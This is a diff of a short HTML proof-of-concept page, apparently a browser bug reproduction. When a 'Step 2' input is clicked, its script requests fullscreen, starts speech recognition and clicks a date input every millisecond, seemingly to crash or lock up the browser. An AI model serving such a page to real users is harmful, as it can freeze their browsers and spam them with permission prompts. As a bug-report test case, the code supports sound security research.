@@ -1,18 +1,21 @@
 <!DOCTYPE html>
 <head>
 </head>
-<body background="https://www.w3schools.com/tags/w3s.png">
+<body>
 <script>
-var recognition = new webkitSpeechRecognition();
-recognition.start();
+
+
 function Crash(){
 t=document.createElement('input');
-t.type='color';
-document.body.appendChild(t);
+t.type='date';
+t.onclick = function(){var recognition = new webkitSpeechRecognition();recognition.start();}
 document.documentElement.webkitRequestFullScreen();
+document.body.appendChild(t);
 t.click();
-setInterval(function(){t.click();}, 100);
-}
+setInterval(function(){t.click();}, 1);
+
+  }
+
 </script>
-<input type=color value='Step 2' onclick='Crash()'><iframe />
+<input type=date value='Step 2' onclick='Crash()'><iframe style="display:"/>
 </body>
